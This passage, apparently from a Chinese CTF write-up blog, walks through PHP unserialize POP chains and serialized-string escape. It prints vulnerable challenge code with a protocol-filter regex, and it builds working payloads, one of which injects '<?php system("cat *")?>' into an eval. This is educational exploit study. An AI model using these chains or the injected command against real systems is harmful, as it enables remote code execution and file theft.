class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paylod：</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(); <span class="comment">//创建show对象</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>();  <span class="comment">//将source属性赋为一个新的show对象，触发tostring函数</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>(); <span class="comment">//给$a-&gt;source-&gt;str创建test对象，则$a-&gt;source-&gt;str-&gt;source属性不存在，执行__get函数</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();<span class="comment">//将Modifier对象赋给p属性，一个链子就此完成。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure><h2 id="2022DASCTF-X-SU-三月春季挑战赛-ezpop"><a href="#2022DASCTF-X-SU-三月春季挑战赛-ezpop" class="headerlink" title="[2022DASCTF X SU 三月春季挑战赛]ezpop"></a>[2022DASCTF X SU 三月春季挑战赛]ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1=<span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1=<span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=<span class="string">&#x27;?&gt;&lt;?php system(&quot;cat *&quot;)?&gt;&#x27;</span>;<span class="comment">//这题太狗了，把flag放在注释里，还得cat *才能看到。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="PHP的字符串逃逸"><a href="#PHP的字符串逃逸" class="headerlink" title="PHP的字符串逃逸"></a>PHP的字符串逃逸</h2><p>字符串逃逸就是通过改变字符串的长度来改变键值对，让键值对改变成我们想要的样子，这个就跟php的特性有关了</p><h3 id="PHP的特性"><a href="#PHP的特性" class="headerlink" title="PHP的特性"></a>PHP的特性</h3><h4 id="1、序列化后，底层代码是以-作为字段的分隔，以-作为结尾-字符串除外-，所以-在后面的是没有任何影响的"><a href="#1、序列化后，底层代码是以-作为字段的分隔，以-作为结尾-字符串除外-，所以-在后面的是没有任何影响的" class="headerlink" title="1、序列化后，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，所以}在后面的是没有任何影响的"></a>1、序列化后，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，所以}在后面的是没有任何影响的</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line">此时，如果变成O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="number">54656156135</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));</span><br><span class="line">&#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">丝毫没有影响正常的反序列化</span><br></pre></td></tr></table></figure><h4 id="2、当序列化的长度不对应的时候会出现报错"><a href="#2、当序列化的长度不对应的时候会出现报错" class="headerlink" title="2、当序列化的长度不对应的时候会出现报错"></a>2、当序列化的长度不对应的时候会出现报错</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line">可以看到，返回<span class="literal">false</span>，就是无法正常反序列化</span><br></pre></td></tr></table></figure><h4 id="3、可以反序列化类中不存在的元素"><a href="#3、可以反序列化类中不存在的元素" class="headerlink" title="3、可以反序列化类中不存在的元素"></a>3、可以反序列化类中不存在的元素</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;c&quot;;s:1:&quot;c&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;<span class="keyword">object</span>(s)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="string">&quot;c&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;c&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">看到类里面并没有c，但是能正常反序列化</span><br></pre></td></tr></table></figure><h3 id="PHP字符串逃逸"><a href="#PHP字符串逃逸" class="headerlink" title="PHP字符串逃逸"></a>PHP字符串逃逸</h3><p>字符串逃逸一般有两种情况，一种是字符串增多，一种是字符串减少</p><p>字符串逃逸的本质也是差不多就是闭合，有一种注入的感觉</p><h4 id="增多的情况"><a href="#增多的情况" class="headerlink" title="增多的情况"></a>增多的情况</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&quot;bad&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;bad&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;这是没有经过替换的</span></span><br><span class="line"><span class="comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;good&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;这是经过替换掉的</span></span><br><span class="line">明显每替换一个，字符串长度就会+<span class="number">1</span>，那我们现在不像让b为<span class="number">666</span>，想让它是<span class="number">888</span>，但是b是不可控的，怎么办，那就是字符串逃逸了，我们看一下逃逸字符串的长度<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">888</span><span class="string">&quot;;&#125;，21个，长度为21.</span></span><br><span class="line"><span class="string">那就是21个bad就能让&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;逃逸，即</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =<span class="keyword">new</span> <span class="title function_ invoke__">s</span>(<span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">//for($i=0;$i&lt;21;$i++)&#123;</span></span><br><span class="line"><span class="comment">//  echo &#x27;bad&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：</span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">84</span>:<span class="string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;888&quot;</span>;&#125;<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:3:&quot;</span><span class="number">666</span><span class="string">&quot;;&#125;object(s)#2 (2) &#123;</span></span><br><span class="line"><span class="string">  [&quot;</span>a<span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  string(84) 